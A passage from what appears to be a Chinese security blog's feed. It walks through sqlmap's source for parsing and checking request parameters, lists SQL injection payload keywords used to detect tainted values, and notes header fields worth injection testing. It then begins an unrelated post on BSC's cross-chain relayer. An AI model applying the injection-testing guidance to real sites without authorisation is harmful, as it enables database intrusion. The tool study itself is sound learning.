<li class="lvl-2">
<p>url并非一定要带参数才有可能存在注入的,只要跟数据库交互的地方都有可能存在注入,可以考虑<code>uri注入</code></p>
</li>
<li class="lvl-2">
<p><code>header</code>中可以测试的点为:- <code>user-agent</code>、<code>referer</code>、<code>host</code>、<code>cookie</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-请求参数的检验和解析(二)</title>
    <url>/2019/9785.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>上篇,讲的解析请求参数函数<code>_setRequestParams()</code>,里面有多处会调用到<code>paramToDict()</code>函数.</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35bb65bd.jpg" alt="" /></p>
<p>如图所示,会调用<code>paramToDict</code>去不同位置的参数:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Get参数</p>
</li>
<li class="lvl-2">
<p>Post参数</p>
</li>
<li class="lvl-2">
<p>Cookie参数</p>
</li>
</ul>
<hr />
<h1>函数说明:</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">paramToDict</span>(<span class="params">place, parameters=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Split the parameters into names and values, check if these parameters</span></span><br><span class="line"><span class="string">    are within the testable parameters and return in a dictionary. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>作用:</p>
<ol>
<li class="lvl-3">
<p>将参数名和参数值分开</p>
</li>
<li class="lvl-3">
<p>判断给的参数在不在这里面</p>
</li>
</ol>
<h1>paramToDict的主要流程</h1>
<h2 id="去除html编码">去除html编码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parameters = re.sub(<span class="string">r&quot;&amp;(\w&#123;1,4&#125;);&quot;</span>, <span class="string">r&quot;%s\g&lt;1&gt;%s&quot;</span> % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), parameters)</span><br></pre></td></tr></table></figure>
<p>参数里可能会包含html编码字符,例如<code>__AMP__</code>, <code>__SEMICOLON__</code><br />
如果有的话,将参数提取出来.</p>
<blockquote>
<p>算是一种优化的手段吧.</p>
</blockquote>
<h2 id="参数分隔">参数分隔</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> place == PLACE.COOKIE:</span><br><span class="line">    splitParams = parameters.split(conf.cookieDel <span class="keyword">or</span> DEFAULT_COOKIE_DELIMITER) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    splitParams = parameters.split(conf.paramDel <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER)</span><br></pre></td></tr></table></figure>
<p>如果是<code>Cookie</code>里的参数,一般用<code>;</code>作为分隔符</p>
<blockquote>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie: gdpr-cookie-consent=accepted; _ga=GA1.2.56372231.1535340163; token=5b836e9cc3dcfa1d7812d915%2F0utWy6TvJ8pITwm1G76m7XXgrQBDY5bZ4Jfkqj9ousVXssC2hOyrDeMFs8PFtkWL;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果是<code>Get、Post</code>里的参数,一般用<code>&amp;</code>作为分隔符</p>
<blockquote>
<p>例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.baidu.com/s?wd=parameter%20&amp;rsv_spt=1&amp;rsv_iqid=0x895d84b600069e8d&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8</span><br></pre></td></tr></table></figure>
</blockquote>
<p>处理后的结果为列表:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[u&#x27;wd=parameter &#x27;, u&#x27;rsv_spt=1&#x27;, u&#x27;rsv_iqid=0x895d84b600069e8d&#x27;, u&#x27;issp=1&#x27;, u&#x27;f=3&#x27;, u&#x27;rsv_bp=1&#x27;, u&#x27;rsv_idx=2&#x27;, u&#x27;ie=utf-8&#x27;]</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="对每个参数进行检验、解析">对每个参数进行检验、解析</h2>
<h3 id="参数名和值分隔">参数名和值分隔</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> splitParams:</span><br><span class="line">    element = re.sub(<span class="string">r&quot;%s(.+?)%s&quot;</span> % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), <span class="string">r&quot;&amp;\g&lt;1&gt;;&quot;</span>, element) <span class="comment"># 去除html标签</span></span><br><span class="line">    parts = element.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">        parameter = urldecode(parts[<span class="number">0</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment"># 解码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> parameter:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> conf.paramDel <span class="keyword">and</span> conf.paramDel == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            parts[-<span class="number">1</span>] = parts[-<span class="number">1</span>].rstrip()</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>参数如果含HTML标签,去掉HTML标签</p>
</li>
<li class="lvl-2">
<p>参数名和值用<code>=</code>分隔</p>
</li>
<li class="lvl-2">
<p><code>urldecode</code>参数名</p>
</li>
</ul>
<h3 id="判断是否满足检验的条件">判断是否满足检验的条件</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">condition = <span class="keyword">not</span> conf.testParameter</span><br><span class="line">condition |= conf.testParameter <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> parameter <span class="keyword">in</span> conf.testParameter</span><br><span class="line">condition |= place == PLACE.COOKIE <span class="keyword">and</span> <span class="built_in">len</span>(intersect((PLACE.COOKIE,), conf.testParameter, <span class="literal">True</span>)) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这个条件<code>condition</code>是并列的or判断,满足任意情况即可</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>没有指定参数</p>
</li>
<li class="lvl-2">
<p>指定了参数 同时 该参数在指定的参数范围里</p>
</li>
<li class="lvl-2">
<p>该参数的位置在cookie 同时 该参数在cookie里</p>
</li>
</ul>
<hr />
<h3 id="开始检验参数值-参数值是否异常-被污染">开始检验参数值-参数值是否异常(被污染)</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    testableParameters[parameter] = <span class="string">&quot;=&quot;</span>.join(parts[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> conf.multipleTargets <span class="keyword">and</span> <span class="keyword">not</span> (conf.csrfToken <span class="keyword">and</span> re.search(conf.csrfToken, parameter, re.I)):</span><br><span class="line">        _ = urldecode(testableParameters[parameter], convall=<span class="literal">True</span>) <span class="comment"># url解码</span></span><br><span class="line">        <span class="keyword">if</span> (_.endswith(<span class="string">&quot;&#x27;&quot;</span>) <span class="keyword">and</span> _.count(<span class="string">&quot;&#x27;&quot;</span>) == <span class="number">1</span> <span class="keyword">or</span> re.search(<span class="string">r&#x27;\A9&#123;3,&#125;&#x27;</span>, _) <span class="keyword">or</span> re.search(<span class="string">r&#x27;\A-\d+\Z&#x27;</span>, _) <span class="keyword">or</span> re.search(DUMMY_USER_INJECTION, _)) <span class="keyword">and</span> <span class="keyword">not</span> parameter.upper().startswith(GOOGLE_ANALYTICS_COOKIE_PREFIX): <span class="comment"># 正则匹配是否含异常字段</span></span><br><span class="line">            warnMsg = <span class="string">&quot;it appears that you have provided tainted parameter values &quot;</span> <span class="comment"># 提示信息</span></span><br><span class="line">            warnMsg += <span class="string">&quot;(&#x27;%s&#x27;) with most likely leftover &quot;</span> % element</span><br><span class="line">            warnMsg += <span class="string">&quot;chars/statements from manual SQL injection test(s). &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;Please, always use only valid parameter values &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;so sqlmap could be able to run properly&quot;</span></span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">            message = <span class="string">&quot;are you really sure that you want to continue (sqlmap could have problems)? [y/N] &quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> readInput(message, default=<span class="string">&#x27;N&#x27;</span>, boolean=<span class="literal">True</span>):</span><br><span class="line">                <span class="keyword">raise</span> SqlmapSilentQuitException</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> _:</span><br><span class="line">            warnMsg = <span class="string">&quot;provided value for parameter &#x27;%s&#x27; is empty. &quot;</span> % parameter</span><br><span class="line">            warnMsg += <span class="string">&quot;Please, always use only valid parameter values &quot;</span></span><br><span class="line">            warnMsg += <span class="string">&quot;so sqlmap could be able to run properly&quot;</span></span><br><span class="line">            logger.warn(warnMsg)</span><br></pre></td></tr></table></figure>
<p>如果同时满足以下情况:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>配置里不是多个检测目标</p>
</li>
<li class="lvl-2">
<p>没有<code>cstf-token</code></p>
</li>
</ul>
<p>会尝试检测参数值是否异常(被污染)</p>
<p>url解码参数值之后,检测出以下情况则认为参数值异常(被污染)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>含有单引号<code>'</code></p>
</li>
<li class="lvl-2">
<p>开头有3个9或者更多 (不知道为什么)</p>
</li>
<li class="lvl-2">
<p>含<code>-数字</code> (类似id=2-1 这种payload吧)</p>
</li>
<li class="lvl-2">
<p>含以下关键词<code>AND</code>、<code>OR</code>、<code>UNION</code>、<code>SELECT</code>、<code>FROM</code>、<code>CONCAT</code>、<code>information_schema</code>、<code>SLEEP</code>、<code>DELAY</code>、<code>FLOOR</code>、<code>(RAND)</code> (常见payload关键字)</p>
</li>
<li class="lvl-2">
<p>含google分析cookie前缀<code>__UTM</code></p>
</li>
</ul>
<p>之所以要这样做异常检测,是跟后面sql注入在参数值前后插入<code>payload</code>的动作有关系的</p>
<p>如果参照值提前含有这些<code>payload</code>字眼,很可能会造成后面的异常.</p>
<p>所以它会提示你</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">are you really sure that you want to continue (sqlmap could have problems)? [y/N] </span><br></pre></td></tr></table></figure>
<hr />
<h3 id="检验Get、Post参数值">检验Get、Post参数值</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> place <span class="keyword">in</span> (PLACE.POST, PLACE.GET):</span><br><span class="line">    <span class="keyword">for</span> regex <span class="keyword">in</span> (<span class="string">r&quot;\A((?:&lt;[^&gt;]+&gt;)+\w+)((?:&lt;[^&gt;]+&gt;)+)\Z&quot;</span>, <span class="string">r&quot;\A([^\w]+.*\w+)([^\w]+)\Z&quot;</span>): </span><br><span class="line">        match = re.search(regex, testableParameters[parameter]) <span class="comment"># 正则匹配</span></span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="comment"># ....</span></span><br></pre></td></tr></table></figure>
<p>通过正则去检验参数值是否特殊,如含特殊的符号.</p>
<p>这两个正则的意思是:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>参数含有标签 (可能是xml数据)</p>
</li>
<li class="lvl-2">
<p>参数除了有数字和字母,有其他符号 (可能是json数据)</p>
</li>
</ul>
<blockquote>
<p>这两个正则有点难理解.</p>
</blockquote>
<hr />
<h3 id="解析Get、Post参数值">解析Get、Post参数值</h3>
<p><strong>参数值</strong>如果比较特殊,就会尝试去解析.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>json反序列化</p>
</li>
<li class="lvl-2">
<p>xml解析</p>
</li>
</ul>
<h4 id="尝试json反序列化">尝试json反序列化</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deserialized = json.loads(testableParameters[parameter])</span><br><span class="line">walk(deserialized)</span><br></pre></td></tr></table></figure>
<p>主要是这个walk()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">walk</span>(<span class="params">head, current=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> current <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        current = head</span><br><span class="line">    <span class="keyword">if</span> isListLike(current):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> current:</span><br><span class="line">            walk(head, _)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(current, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> current.keys():</span><br><span class="line">            value = current[key]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>, <span class="built_in">dict</span>)):</span><br><span class="line">                <span class="keyword">if</span> value:</span><br><span class="line">                    walk(head, value)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">bool</span>, <span class="built_in">int</span>, <span class="built_in">float</span>, basestring)):</span><br><span class="line">                original = current[key]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">bool</span>):</span><br><span class="line">                    current[key] = <span class="string">&quot;%s%s&quot;</span> % (getUnicode(value).lower(), BOUNDED_INJECTION_MARKER)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    current[key] = <span class="string">&quot;%s%s&quot;</span> % (value, BOUNDED_INJECTION_MARKER)</span><br><span class="line">                candidates[<span class="string">&quot;%s (%s)&quot;</span> % (parameter, key)] = re.sub(<span class="string">r&quot;\b(%s\s*=\s*)%s&quot;</span> % (re.escape(parameter), re.escape(testableParameters[parameter])), <span class="string">r&quot;\g&lt;1&gt;%s&quot;</span> % json.dumps(deserialized, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>) <span class="keyword">if</span> <span class="string">&quot;, &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> testableParameters[parameter] <span class="keyword">else</span> <span class="literal">None</span>), parameters)</span><br><span class="line">                current[key] = original</span><br></pre></td></tr></table></figure>
<p>该<code>walk()</code>函数,通过递归的方式,检查json里面的每个值是否是符合某个数据类型.</p>
<p>如果该参数值能够反序列化,<code>sqlmap</code>会提示说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xx parameter is JSON deserializable. Do you want to inject inside?</span><br></pre></td></tr></table></figure>
<p>例子:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35c6d51b.jpg" alt="" /></p>
<p>比如通过表单的方式来传json类型的数据.</p>
<p>整个包不符合json类型,但是里面的参数值是可以被Json反序列化的.</p>
<h4 id="尝试xml解析">尝试xml解析:</h4>
<p>比如这类的数据包(为了方便看,xml参数已urldecode):</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35d21b7a.jpg" alt="" /></p>
<p>比如通过表单的方式来传xml类型的数据.</p>
<p>整个包不符合xml类型,但是里面的某个参数值是xml类型的数据.</p>
<p>解析到该类型数据,<code>sqlmap</code>会提示说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it appears that provided value for POST parameter &#x27;xml&#x27; has boundaries. Do you want to inject inside? </span><br></pre></td></tr></table></figure>
<hr />
<h2 id="结束解析">结束解析:</h2>
<h3 id="判断指定的参数有没在可测试的参数字典里面">判断指定的参数有没在可测试的参数字典里面.</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数开始</span></span><br><span class="line">testableParameters = OrderedDict() </span><br></pre></td></tr></table></figure>
<p>函数开始的一开始,就定义了一个有序字典,用来存放<strong>可测试的参数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.testParameter: <span class="comment"># 通过-p指定可测试参数,如果给了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> testableParameters: <span class="comment"># 如果没有可测试参数</span></span><br><span class="line">        paramStr = <span class="string">&quot;, &quot;</span>.join(test <span class="keyword">for</span> test <span class="keyword">in</span> conf.testParameter)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(conf.testParameter) &gt; <span class="number">1</span>:</span><br><span class="line">            warnMsg = <span class="string">&quot;provided parameters &#x27;%s&#x27; &quot;</span> % paramStr</span><br><span class="line">            warnMsg += <span class="string">&quot;are not inside the %s&quot;</span> % place</span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parameter = conf.testParameter[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> intersect(USER_AGENT_ALIASES + REFERER_ALIASES + HOST_ALIASES, parameter, <span class="literal">True</span>):</span><br><span class="line">                debugMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % paramStr</span><br><span class="line">                debugMsg += <span class="string">&quot;is not inside the %s&quot;</span> % place</span><br><span class="line">                logger.debug(debugMsg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(conf.testParameter) != <span class="built_in">len</span>(testableParameters):</span><br><span class="line">        <span class="keyword">for</span> parameter <span class="keyword">in</span> conf.testParameter:</span><br><span class="line">            <span class="keyword">if</span> parameter <span class="keyword">not</span> <span class="keyword">in</span> testableParameters:</span><br><span class="line">                debugMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % parameter</span><br><span class="line">                debugMsg += <span class="string">&quot;is not inside the %s&quot;</span> % place</span><br><span class="line">                logger.debug(debugMsg)</span><br></pre></td></tr></table></figure>
<p>经过检验和解析后,testableParameters里存放着<code>sqlmap</code>认为可以测试的点.</p>
<p>例子:</p>
<p>一个普通的post包:<br />
<img src="https://i.loli.net/2019/04/26/5cc2e35dbda98.jpg" alt="" /></p>
<p>通过post传过去的参数只有<code>sceneId</code></p>
<p>但是<code>sqlmap</code>认为可测试的点有很多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-------testableParameters--------</span><br><span class="line">OrderedDict([(u&#x27;JSESSIONID&#x27;, u&#x27;6006F1BD1A9B669150FBF263483BE49B&#x27;), (u&#x27;gr_user_id&#x27;, u&#x27;6f346caa-beb4-49c1-bab6-4c684bb5680a&#x27;), (u&#x27;ajs_user_id&#x27;, u&#x27;null&#x27;), (u&#x27;ajs_group_id&#x27;, u&#x27;null&#x27;), (u&#x27;ajs_anonymous_id&#x27;, u&#x27;%2265b5e8a7-ef15-4279-8897-0cf64a34baaa%22&#x27;), (u&#x27;zg_did&#x27;, u&#x27;%7B%22did%22%3A%20%221693241ce78150-0e47fe537c96ac-4c322f7c-144000-1693241ce796db%22%7D&#x27;), (u&#x27;zg_153e3dce26ad42f2af4ae846edfdc259&#x27;, u&#x27;%7B%22sid%22%3A%201551335266969%2C%22updated%22%3A%201551335266979%2C%22info%22%3A%201551326367365%2C%22superProperty%22%3A%20%22%7B%7D%22%2C%22platform%22%3A%20%22%7B%7D%22%2C%22utm%22%3A%20%22%7B%7D%22%2C%22referrerDomain%22%3A%20%22%22%2C%22landHref%22%3A%20%22http%3A%2F%2Fwotubbs.vanke.com%2Fwotuhome_node%2F%23%2F%22%7D&#x27;), (u&#x27;UM_distinctid&#x27;, u&#x27;16955f9cc826fe-022ac9d6e823218-4c322f7c-144000-16955f9cc83645&#x27;)])</span><br><span class="line">-------testableParameters--------</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可能就这是自动化工具与手工测试的差别</p>
</blockquote>
<hr />
<h3 id="尝试对参数值解密">尝试对参数值解密:</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> testableParameters: <span class="comment"># 有可测试的参数</span></span><br><span class="line">    <span class="keyword">for</span> parameter, value <span class="keyword">in</span> testableParameters.items():</span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> <span class="keyword">not</span> value.isdigit():</span><br><span class="line">            <span class="keyword">for</span> encoding <span class="keyword">in</span> (<span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    decoded = value.decode(encoding) <span class="comment"># 尝试解码</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(decoded) &gt; MIN_ENCODED_LEN_CHECK <span class="keyword">and</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> string.printable <span class="keyword">for</span> _ <span class="keyword">in</span> decoded): <span class="comment">#</span></span><br><span class="line">                        <span class="comment"># MIN_ENCODED_LEN_CHECK:5</span></span><br><span class="line">                        warnMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % parameter</span><br><span class="line">                        warnMsg += <span class="string">&quot;appears to be &#x27;%s&#x27; encoded&quot;</span> % encoding</span><br><span class="line">                        logger.warn(warnMsg)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>解密方式:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>hex</code></p>
</li>
<li class="lvl-2">
<p><code>base64</code></p>
</li>
</ul>
<hr />
<h1>总结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>参数里可能会包含html编码字符,例如<code>__AMP__</code>, <code>__SEMICOLON__</code>. 如果有的话,将参数提取出来.</p>
</li>
<li class="lvl-2">
<p>参数分隔:</p>
<ul class="lvl-2">
<li class="lvl-5">Cookie里的参数,一般用<code>;</code>作为分隔符</li>
<li class="lvl-5">Get、Post里的参数,一般用<code>&amp;</code>作为分隔符</li>
</ul>
</li>
<li class="lvl-2">
<p>参数如果含HTML标签,去掉HTML标签</p>
</li>
<li class="lvl-2">
<p>参数名和值分隔,一般用<code>=</code>分隔</p>
</li>
<li class="lvl-2">
<p><code>urldecode</code>参数名</p>
</li>
<li class="lvl-2">
<p>检验参数值,<strong>参数值被污染</strong>的情况:</p>
<ul class="lvl-2">
<li class="lvl-4">含有单引号<code>'</code></li>
<li class="lvl-4">开头有3个9或者更多 (不知道为什么)</li>
<li class="lvl-4">含<code>-数字</code> (类似id=2-1 这种payload吧)</li>
<li class="lvl-4">含以下关键词<code>AND</code>、<code>OR</code>、<code>UNION</code>、<code>SELECT</code>、<code>FROM</code>、<code>CONCAT</code>、<code>information_schema</code>、<code>SLEEP</code>、<code>DELAY</code>、<code>FLOOR</code>、<code>(RAND)</code> (常见payload关键字)</li>
<li class="lvl-4">含google分析cookie前缀<code>__UTM</code></li>
</ul>
</li>
<li class="lvl-2">
<p>解析特殊情况的参数值:</p>
<ul class="lvl-2">
<li class="lvl-4">通过表单方式提交的<code>xml</code>数据</li>
<li class="lvl-4">通过表单方式提交的<code>json</code>数据</li>
</ul>
</li>
<li class="lvl-2">
<p>尝试对参数值解密:<code>base64</code>, <code>hex</code></p>
</li>
<li class="lvl-2">
<p>自动化工具发现的<strong>可测试的参数</strong>一般比手工测试发现得多.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Bsc详解-bsc_relayer同步区块头</title>
    <url>/2022/48095.html</url>
    <content><![CDATA[<h1>引言:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220922173707.png" alt="20220922173707" /><br />
目的：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>本地搭建起BSC和BC两条链</p>
</li>
<li class="lvl-2">
<p>启动bsc_relayer,能成功与两条链建立连接</p>
</li>
<li class="lvl-2">
<p>bsc_relayer要能同步数据成功:拉取BC的数据,同步到BSC上,能成功修改bsc对应合约里的数据</p>
</li>
</ul>
<h1>bsc-relayer中继器:</h1>
<h2 id="简介-3">简介:</h2>
<p>bsc-relayer 是一个独立进程，主要有两个功能：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>拉取 BC 的块头，并同步给 BSC</p>
</li>
<li class="lvl-2">
<p>拉取 BC 的跨链数据包，并同步跨链数据包给 BSC</p>
</li>
</ul>
<p>跨链同步主要涉及两个系统合约，分别为</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>TendermintLightClient.sol</code>: 同步块头的操作时会调用到</p>
</li>
<li class="lvl-2">
<p><code>CrossChain.sol</code>: 同步跨链数据包的操作会调用到</p>
</li>
</ul>
<h2 id="与两条链的连接方式">与两条链的连接方式:</h2>
<p>bsc-relayer 与 BC、BSC 均通过 RPC 进行通信。</p>
<ol>
<li class="lvl-3">
<p><code>bsc-relayer &lt;-----&gt; BC</code>:<br />
bsc-relayer 通过发送不同的请求信息获取 BC 上的数据，例如 <code>abci_info</code>、<code>block</code>等。</p>
</li>
<li class="lvl-3">
<p><code>bsc-relayer &lt;-----&gt; BSC</code>:<br />
bsc-relayer 直接使用了 Etheruem 提供的 RPC 模块，可直接调用发送数据或者请求，其中最常用的是<code>eth_sendRawTransaction</code>进行交易的发送。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220922175541.png" alt="20220922175541" /><br />
RPC 的配置信息记录在 <code>config/config.json</code> 文件里:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220922175444.png" alt="20220922175444" /></p>
<h2 id="涉及到的系统合约">涉及到的系统合约:</h2>
<p>可在<a href="https://github.com/bnb-chain/bsc-relayer">bsc-relayer</a>里的<code>const.go</code>中看到:</p>
<figure class="highlight go"><figcaption><span>executor/const.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	prefixForCrossChainPackageKey = []<span class="type">byte</span>&#123;<span class="number">0x00</span>&#125;</span><br><span class="line">	prefixForSequenceKey          = []<span class="type">byte</span>&#123;<span class="number">0xf0</span>&#125;</span><br><span class="line"></span><br><span class="line">	PureHeaderSyncChannelID relayercommon.CrossChainChannelID = <span class="number">-1</span></span><br><span class="line">	<span class="comment">// 只涉及以下4个合约</span></span><br><span class="line">	<span class="comment">// TendermintLightClient.sol负责执行 bsc-relayer 发送过来的“同步块头”的交易，和 tmHeaderValidate 预编译合约一同工作：</span></span><br><span class="line">	tendermintLightClientContractAddr = common.HexToAddress(<span class="string">&quot;0x0000000000000000000000000000000000001003&quot;</span>)</span><br><span class="line">	<span class="comment">// 中继者奖励合约</span></span><br><span class="line">	relayerIncentivizeContractAddr    = common.HexToAddress(<span class="string">&quot;0x0000000000000000000000000000000000001005&quot;</span>)</span><br><span class="line">	<span class="comment">// RelayerHub 管理 bsc-relayer 的权限。想要运行 bsc-relayer 的人必须调用合约来存入一些 BNB 以获得授权。</span></span><br><span class="line">	relayerHubContractAddr            = common.HexToAddress(<span class="string">&quot;0x0000000000000000000000000000000000001006&quot;</span>)</span><br><span class="line">	<span class="comment">// CrossChain 跨链包预处理，通过 emit 事件发送跨链包到 BC。包预处理包括序列验证和默克尔证明验证</span></span><br><span class="line">	crossChainContractAddr            = common.HexToAddress(<span class="string">&quot;0x0000000000000000000000000000000000002000&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>只涉及到4个系统合约:</p>
<table>
<thead>
<tr>
<th>sequence</th>
<th>ContractName</th>
<th>ContractNameCN</th>
<th>Role</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>TendermintLightClient Contract</td>
<td>Tendermint轻客户端合约</td>
<td>负责执行 <code>bsc-relayer</code>中继器发送过来的“同步块头”的交易</td>
</tr>
<tr>
<td>2</td>
<td>RelayerIncentivize Contract</td>
<td>中继器奖励合约</td>
<td>用于 <code>bsc-relayer</code> claim reward。而 bsc-validator 的 reward 为打包出块的<code>tx</code>的 gas</td>
</tr>
<tr>
<td>3</td>
<td>RelayerHub Contract</td>
<td>中继器管理合约</td>
<td>用于记录 <code>bsc-relayer</code> 的注册信息, RelayerHub 管理<code>bsc-relayer</code>的权限.想要运行<code>bsc-relayer</code>的人必须调用合约来存入一些 BNB 以获得授权。</td>
</tr>
<tr>
<td>4</td>
<td>CrossChain Contract</td>
<td>跨链包处理合约</td>
<td>负责执行<code>bsc-relayer</code>发送过来的“同步跨链数据包”的交易,进行跨链包预处理,通过<code>emit</code>事件发送跨链包到<code>BC</code>.包预处理包括序列验证和默克尔证明验证</td>
</tr>
</tbody>
</table>
<blockquote>
<p>现在先看<code>TendermintLightClient.sol</code>轻客户端的源码及其实现</p>
</blockquote>
<h1>轻客户端的实现:</h1>
<p><a href="https://docs.bnbchain.org/docs/learn/system-contract/">官方文档</a>里有介绍。<strong>BSC用智能合约的形式,实现了一个轻客户端。</strong></p>
<blockquote>
<p>跨链互操作性的目的是<strong>使一个区块链能够充当另一个区块链的轻客户端。</strong></p>
<p>由于信标链使用经典的拜占庭容错共识算法，轻客户端验证既便宜又容易：我们所要做的就是<code>检查最新区块上的验证者签名</code>，并<code>验证状态的默克尔证明</code>。</p>
<p>在 Tendermint 中，验证者在处理区块之前就区块达成一致。<br />
